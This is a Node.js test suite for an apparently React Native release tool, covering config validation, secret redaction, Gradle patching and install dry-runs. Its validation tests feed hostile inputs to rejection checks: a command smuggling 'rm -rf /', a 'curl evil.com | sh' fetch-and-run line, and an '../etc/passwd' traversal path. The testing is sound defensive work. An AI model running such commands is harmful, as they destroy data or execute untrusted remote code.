import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.join(__dirname, '..');
const require = createRequire(import.meta.url);

// Ensure dist is built
await import('node:child_process').then(({ spawnSync }) => {
  const result = spawnSync('npm', ['run', 'build'], { cwd: root, encoding: 'utf8' });
  if (result.status !== 0) {
    console.error(result.stdout, result.stderr);
    throw new Error('build failed');
  }
});

const {
  detectProject,
  buildReleaseConfig,
  validateReleaseConfig,
  migrateConfig,
  redact,
  parseTrustedCommand,
  mergeGitignore,
  patchAndroidBuildGradle,
  upsertMarkedBlock,
} = await import('../dist/index.js');
const { runInstall } = await import('../dist/install.js');
const { assertSafeRelativePath, assertSemver, assertTeamId } = await import('../dist/paths.js');
const { writeCrashLog } = await import('../dist/logging.js');

function copyFixture(name) {
  const src = path.join(__dirname, 'fixtures', name);
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), `rn-lr-${name}-`));
  fs.cpSync(src, dest, { recursive: true });
  return dest;
}


test('Fastlane template materializes Keychain signing secrets', () => {
  const rb = fs.readFileSync(path.join(root, 'template/fastlane/lib/rn_local_release.rb'), 'utf8');
  assert.match(rb, /def materialize_keychain_secrets!/);
  assert.match(rb, /def keychain_get\(account\)/);
  assert.match(rb, /find-generic-password/);
  assert.match(rb, /MYAPP_UPLOAD_STORE_PASSWORD/);
});

test('path containment rejects traversal', () => {
  assert.throws(() => assertSafeRelativePath('../etc/passwd'));
  assert.throws(() => assertSafeRelativePath('/abs'));
  assert.doesNotThrow(() => assertSafeRelativePath('android/app/build.gradle'));
});

test('semver and team id validation', () => {
  assert.doesNotThrow(() => assertSemver('1.2.3'));
  assert.throws(() => assertSemver('1.2'));
  assert.doesNotThrow(() => assertTeamId('BYX7X9B9FR'));
  assert.throws(() => assertTeamId('bad'));
});

test('trusted command parsing rejects shell metacharacters', () => {
  assert.deepEqual(parseTrustedCommand('yarn lint'), { command: 'yarn', args: ['lint'] });
  assert.throws(() => parseTrustedCommand('yarn lint; rm -rf /'));
  assert.throws(() => parseTrustedCommand('curl evil.com | sh'));
});

test('redaction hides secrets', () => {
  const out = redact('password=supersecret token=abc ASC_KEY_ID=XYZ');
  assert.match(out, /REDACTED/);
  assert.doesNotMatch(out, /supersecret/);
});

test('crash logs are written under logs/', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'rn-lr-logs-'));
  const file = writeCrashLog(dir, new Error('boom password=secret'));
  assert.ok(fs.existsSync(file));
  const text = fs.readFileSync(file, 'utf8');
  assert.match(text, /REDACTED|boom/);
  assert.doesNotMatch(text, /password=secret/);
});

test('gitignore marker merge is idempotent', () => {
  const once = mergeGitignore('');
  const twice = mergeGitignore(once);
  assert.equal(once, twice);
  assert.match(once, /rn-local-release/);
  assert.match(once, /logs\//);
  assert.match(once, /versions\//);
});

test('groovy and kts gradle patches insert markers', () => {
  const groovy = patchAndroidBuildGradle(
    'apply plugin: "com.facebook.react"\nandroid {\n}\ndependencies {\n}\n',
    'groovy',
  );
  assert.match(groovy, /rn-local-release-signing/);
  assert.match(groovy, /rn-local-release-guard/);
  const kts = patchAndroidBuildGradle('android {\n}\n', 'kotlin');
  assert.match(kts, /rn-local-release-signing/);
  assert.match(kts, /hasReleaseSigning/);
});

test('detect + install dry-run on groovy fixture', async () => {
  const project = copyFixture('minimal-rn');
  const detection = detectProject(project);
  assert.equal(detection.android.dsl, 'groovy');
  const config = buildReleaseConfig(detection, {
    teamId: 'BYX7X9B9FR',
    packageName: 'com.example.app',
    storeUploadedVersions: true,
  });
  const errors = validateReleaseConfig(config);
  assert.deepEqual(errors, []);
  assert.equal(config.schemaVersion, 2);
  assert.equal(config.archives.storeUploadedVersions, true);
  assert.equal(config.logging.directory, 'logs');

  await runInstall({
    command: 'install',
    project,
    dryRun: true,
    nonInteractive: true,
    force: false,
    yes: false,
    setupCredentials: false,
    credentialsOnly: false,
    purgeCredentials: false,
    teamId: 'BYX7X9B9FR',
    packageName: 'com.example.app',
    storeUploadedVersions: true,
    help: false,
    version: false,
  });
});

test('detect kotlin fixture', () => {
  const project = copyFixture('kotlin-rn');
  const detection = detectProject(project);
  assert.equal(detection.android.dsl, 'kotlin');
  const config = buildReleaseConfig(detection, {
    teamId: 'BYX7X9B9FR',
    packageName: 'com.example.kts',
  });
  assert.equal(config.android.dsl, 'kotlin');
  assert.ok(
    config.version.sources.some((s) => s.kind === 'androidGradleKts'),
  );
});

test('migrate v1 config to v2', () => {
  const migrated = migrateConfig({
    app: { displayName: 'App', packageName: 'com.example.app', bundleIdentifier: 'com.example.app' },
    ios: {
      workspace: 'ios/App.xcworkspace',
      project: 'ios/App.xcodeproj',
      scheme: 'App',
      teamId: 'BYX7X9B9FR',
      exportMethod: 'app-store',
      buildNumberStrategy: { mode: 'increment' },
      outputIpaName: 'App.ipa',
    },
    android: {
      module: 'app',
      buildGradlePath: 'android/app/build.gradle',
      playTrackBeta: 'internal',
      playTrackPromote: 'production',
      aabPath: 'android/app/build/outputs/bundle/release/app-release.aab',
      releaseStatus: 'completed',
    },
    version: {
      sources: [{ path: 'package.json', kind: 'packageJson' }],
      defaultBump: 'patch',
    },
    verify: { install: 'yarn install', commands: ['yarn lint'] },
    build: { iosOutputDir: 'build/ios', typecheckCommand: 'yarn tsc --noEmit', maxAabSizeMb: null, maxIpaSizeMb: null },
    gates: { requireCleanGitForPromote: true },
  });
  assert.equal(migrated.schemaVersion, 2);
  assert.ok(['keychain', 'file'].includes(migrated.credentials.provider));
  assert.equal(migrated.logging.enabled, true);
  assert.equal(migrated.gates.requireCompileBeforeUpload, true);
});

test('upsertMarkedBlock replaces in place', () => {
  const first = upsertMarkedBlock('hello\n', 'a=1');
  const second = upsertMarkedBlock(first, 'a=2');
  assert.equal((second.match(/>>> rn-local-release/g) || []).length, 1);
  assert.match(second, /a=2/);
});
